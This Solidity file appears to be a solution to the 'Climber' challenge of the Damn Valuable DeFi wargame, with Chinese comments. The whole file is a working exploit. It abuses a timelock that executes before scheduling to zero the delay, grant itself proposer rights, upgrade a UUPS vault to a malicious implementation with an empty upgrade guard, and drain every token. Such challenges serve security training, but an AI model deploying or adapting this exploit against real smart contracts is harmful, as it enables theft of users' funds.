// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {ClimberVault, Initializable, OwnableUpgradeable, UUPSUpgradeable} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, PROPOSER_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract ClimberExploit {
    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;
    address recovery;
    // 升级新合约
    NewValutImp newVault;
    
    constructor(
        ClimberVault _vault, 
        ClimberTimelock _timelock, 
        DamnValuableToken _token,
        address _recovery) 
    {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        recovery = _recovery;
    }


    // 之前  gas  2380648
    // 优化后gas  1634375
     function rescue() public {
         newVault = new NewValutImp();

        (
            address[] memory targets, 
            uint256[] memory values, 
            bytes[] memory dataElements
        ) = getCalls();

        // 先执行 schedule

        // 再执行 execute
        timelock.execute(
            targets,
            values,
            dataElements,
            bytes32(0)
        );

        // 执行完上述 call，已更新为我们的新合约
        // 执行新合约 drain 方法掏空合约 Token
        NewValutImp(address(vault)).drain(
            address(token),
            recovery
        );
    }


    // 使用 memory 优化 gas
    function getCalls() internal returns(
        address[] memory targets, 
        uint256[] memory values,
        bytes[] memory dataElements
    ) 
    {
        // execute执行的
        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);
        // bytes32[] memory salt_array = new bytes32[](1);

        // 1. 将 updateDelay 设置到 0
        targets[0] = address(timelock);
        values[0] = 0;

        dataElements[0] = abi.encodeWithSelector(
            timelock.updateDelay.selector,
            0
        );

        // 2. 通过 grantRole 授予本合约 PROPOSER_ROLE 权限， 用于执行
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(
            timelock.grantRole.selector,
            PROPOSER_ROLE,
            address(this)
        );

        // !!! 升级合约
        // 3. 升级到新的实现合约（有相同存储布局）
        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(
            vault.upgradeToAndCall.selector,
            address(newVault),
            ""
        );

        // !!! 批量schedule交易
        // 4.将包含多笔交易calldata的方法压缩到一笔calldata交易
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(
            this.toSchedule.selector,
            address(this),
            ""
        );
    }


    function toSchedule() public {
        (
            address[] memory targets_array, 
            uint256[] memory values_array, 
            bytes[] memory dataElements_array
        ) = getCalls();        

        // 需先进行 schedule
        timelock.schedule(
            targets_array,
            values_array,
            dataElements_array,
            bytes32(0)
        );
    }

}

// 升级为新实现合约
// ?? UUPS 升级方法与逻辑
// 升级要调用 UUPSUpgradeable::proxiableUUID
contract NewValutImp is
    // Initializable,
    // OwnableUpgradeable
    UUPSUpgradeable
{
    
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;
    // 新合约中添加新函数  drain 提取所有 token
    // 因为升级后 token 的所有者仍然是 proxy合约
    function drain(address token, address recipient) external {
        SafeTransferLib.safeTransfer(
            token,
            recipient,
            IERC20(token).balanceOf(address(this))
        );
    }

    // 必须保留该方法
    function _authorizeUpgrade(address newImplementation) override internal  {}

}